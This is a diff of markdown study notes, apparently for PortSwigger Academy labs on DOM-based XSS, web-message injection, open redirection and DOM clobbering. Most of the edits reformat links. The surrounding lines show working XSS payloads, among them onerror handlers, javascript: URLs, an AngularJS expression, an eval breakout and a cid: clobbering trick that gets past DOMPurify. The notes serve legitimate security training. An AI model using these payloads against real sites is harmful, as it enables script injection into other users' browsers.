@@ -12,7 +12,7 @@ https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage -->
 https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
 #
 # ***1. Lab: DOM XSS using web messages***
-https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
+[to the Lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
 
 hint:
 ```htm
@@ -38,7 +38,7 @@ avoid apos char at: src='x' and onerror='print()'. they break the payload here
 
 
 # ***2.  Lab: DOM XSS using web messages and a JavaScript URL*** 
-https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
+[to the Lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 
 look for vulnarble JS functions by finding script>tag in responses:
 find:
@@ -69,7 +69,7 @@ https://brutelogic.com.br/blog/alternative-javascript-pseudo-protocol/ -->
 # DOMed!
 
 # ***3.  Lab: DOM XSS using web messages and JSON.parse*** 
-https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
+[to the Lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 
 look for vulnarble script> tags at proxie - find:
 ```htm
@@ -114,10 +114,10 @@ escape the " in the jason to avoid breaking the outer iframe shell -->
 
 
 # DOM-based open redirection (1 lab)
-https://portswigger.net/web-security/dom-based/open-redirection
+[Matrials](https://portswigger.net/web-security/dom-based/open-redirection)
 
 # ***1.  Lab: DOM-based open redirection*** 
-https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection
+[to the Lab](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 
 look for keyword url in response - find in post pages (GET /post?postId=1 HTTP/1.1):
 ```htm
@@ -182,10 +182,10 @@ supercool :) -->
 
 
 # DOM-based XSS
-https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data
+[Materials](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)
 
 # ***1.Lab: DOM XSS in document.write sink using source location.search*** 
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
 
 original Java script:
     function trackSearch(query) {
@@ -204,7 +204,7 @@ payload:
 
 
 # ***2. Lab: DOM XSS in document.write sink using source location.search inside a select element***
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
 
 original Java script:
     var stores = ["London","Paris","Milan"];
@@ -235,7 +235,7 @@ portswiggers solution:
 
 
 # ***3. Lab: DOM XSS in innerHTML sink using source location.search***
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
 
 original Java script:
     function doSearchQuery(query) {
@@ -258,8 +258,7 @@ GET /?search=<img%20src=1%20onerror=alert(1)> HTTP/1.
 
 
 # ***4. Lab: DOM XSS in jQuery anchor href attribute sink using location.search source***
-
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
 
 
 original script:
@@ -281,8 +280,7 @@ GET /feedback?returnPath=javascript:alert(document.domain) HTTP/1.1
 
 
 # ***5. Lab: DOM XSS in jQuery selector sink using a hashchange event***
-
-https:/portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+[to the Lab](https:/portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
 ```
 original script:
     $(window).on('hashchange', function(){
@@ -302,7 +300,7 @@ to be stored on attacker server and deliverd as url
 
 
 # ***6. Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded***
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
 
 vulnerable code:
 ```
@@ -319,7 +317,11 @@ GET /?search={{$on.constructor('alert(1)')()}} HTTP/1.1
 ```
 
 # ***7. Lab: DOM XSS combined with reflected and stored data***
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
+
+ This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+To solve this lab, create an injection that calls the alert() function. 
 
 original script:
 ```
@@ -343,7 +345,7 @@ eval('var searchResultsObj = ' + this.responseText)
 ```
 \"-alert(1)}//
 ```
-full payload request:
+full payload request to test in browser:
 ```
 eval('var searchResultsObj = ' +  \"-alert(1)}//
 ```
@@ -356,7 +358,7 @@ HTTP/1.1 200 OK
 ```
 
 # ***8. Lab: Stored DOM XSS***
-https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
+[to the Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
 
 payload:
 ```
@@ -373,6 +375,11 @@ DOM clobbering
 </span>
 
 https://portswigger.net/web-security/dom-based/dom-clobbering
+
+
+
+# ***1. Lab: Lab: Exploiting DOM clobbering to enable XSS***
+[to the Lab](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
 
 This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function. 
 
@@ -412,12 +419,13 @@ userComments.appendChild(commentSection);
 ```
 
 payload:
-```
+```htm
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert()//">
 ```
-DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded. 
 
-better to write payload straight at the comment box on site
+> DOMPurify allows you to use the **cid:** protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded. 
+
+*tip for the lab: better experiment with different payloads straight at the comment box on site*
 
 <!-- didnt work: 
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href=<img src=x onerror=alert();>
@@ -426,7 +434,7 @@ better to write payload straight at the comment box on site
 
 
 # ***2. Lab: Clobbering DOM attributes to bypass HTML filters***
-https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters
+[to the Lab](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
 
 This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser. 
 
